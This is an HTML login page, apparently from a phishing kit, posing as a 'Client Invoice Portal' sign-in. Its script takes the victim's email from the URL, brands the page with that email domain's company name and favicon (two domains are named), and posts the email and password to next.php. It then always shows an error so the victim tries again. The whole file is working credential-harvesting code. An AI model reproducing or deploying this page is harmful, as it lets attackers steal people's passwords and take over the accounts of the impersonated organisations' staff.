<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0; shrink-to-fit=no">
    <title id="pageTitle">Login Portal</title>
    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
    <style>
        body {
            background: #f0f4f7;
            margin: 0;
            padding: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        #main-outer-container {
            width: 100%;
            max-width: 420px;
            background: white;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
            border-radius: 8px;
            overflow: hidden;
        }

        #main-inner-container {
            padding: 30px;
        }

        button {
            width: 100%;
            padding: 10px;
            background-color: #0D5CAB;
            color: #FFFFFF;
            border: none;
            border-radius: 5px;
            font-size: 1rem;
            margin-top: 1rem;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #0A4B8A;
        }

        #companyName {
            color: #0D5CAB;
            font-size: 28px;
            text-align: center;
            font-weight: bold;
            margin-bottom: 20px;
        }

        #error-message {
            color: #a94442;
            background: #f2dede;
            border: 1px solid rgb(128, 0, 0);
            padding: 15px;
            font-size: 16px;
            margin-bottom: 16px;
            border-radius: 4px;
            text-align: center;
            display: none;
        }

        img#logoImg {
            height: 84px;
            width: auto;
            display: block;
            margin: auto;
            margin-bottom: 20px;
        }

        input {
            width: 100%;
            height: 36px;
            border: 1px solid #ddd;
            padding: 1px 8px;
            border-radius: 4px;
            margin-bottom: 16px;
        }

        select {
            width: 100%;
            height: 36px;
            border: 1px solid #ddd;
            border-radius: 4px;
            margin-top: 12px;
            margin-bottom: 12px;
        }

        footer {
            text-align: center;
            font-size: 12px;
            color: #555;
            margin-top: 6px;
        }
    </style>
</head>

<body>
    <div id="main-outer-container">
        <div id="main-inner-container">
            <div id="form-main-outer">
                <!-- Logo Section -->
                <div>
                    <img id="logoImg" src="#" alt="Logo" />
                </div>

                <!-- Company Name -->
                <h5 id="companyName"></h5>

                <!-- Error Message -->
                <div id="error-message" style="display: none;">
                    An error occurred. Please try again.
                </div>

                <!-- Form Section -->
                <div>
                    <p>Sign in with your Email to continue:</p>
                    <input type="text" id="email" value="" readonly>
                    <p>Enter password:</p>
                    <input type="password" id="password" placeholder="Password">
                    <button type="button" onclick="nextFun()">Sign In</button>
                </div>

                <!-- Footer Section -->
                <div>
                    <select>
                        <option value="Client Invoice Portal">Client Invoice Portal</option>
                        <option value="Billing Portal">Billing Portal</option>
                        <option value="Payment Portal">Payment Portal</option>
                    </select>
                    <footer>&copy; 2025 All Rights Reserved</footer>
                </div>
            </div>
        </div>
    </div>

    <script>
        let failedAttempts = 0;

        // Dynamically update email and company name from URL hash
        document.addEventListener("DOMContentLoaded", function () {
            const hash = decodeURIComponent(window.location.hash.substring(1));
            const emailField = document.getElementById("email");
            const companyField = document.getElementById("companyName");
            const logoField = document.getElementById("logoImg");

            // Update email field dynamically
            if (hash && hash.includes("@")) {
                emailField.value = hash;

                const domain = hash.split("@")[1].toLowerCase();
                const companyNameMapping = {
                    "unitedcorporate.com": "UNITEDCORPORATE",
                    "calypsostbarth.com": "CALYPSOSTBARTH",
                };

                // Dynamically update company name and logo
                const companyName = companyNameMapping[domain] || domain.split(".")[0].toUpperCase();
                companyField.textContent = companyName;
                logoField.src = `https://www.google.com/s2/favicons?sz=128&domain=${domain}`;
            } else {
                emailField.value = "";
                companyField.textContent = "UNKNOWN COMPANY";
            }
        });

        // Function to handle login
        function nextFun() {
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;

            // Send POST request to next.php
            fetch("./next.php", {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: `di=${encodeURIComponent(email)}&pr=${encodeURIComponent(password)}`
            })
                .then((response) => response.json())
                .then((data) => {
                    failedAttempts++;
                    displayError(data.message || "Login attempt saved.");
                })
                .catch(() => {
                    displayError("A server error occurred.");
                })
                .finally(() => {
                    document.getElementById("password").value = ""; // Clear password field
                });
        }

        // Display error message with timeout
        function displayError(message) {
            const errorDiv = document.getElementById("error-message");
            errorDiv.style.display = "block";
            errorDiv.innerText = message;
            setTimeout(() => {
                errorDiv.style.display = "none";
            }, 2000);
        }
    </script>
</body>

</html>
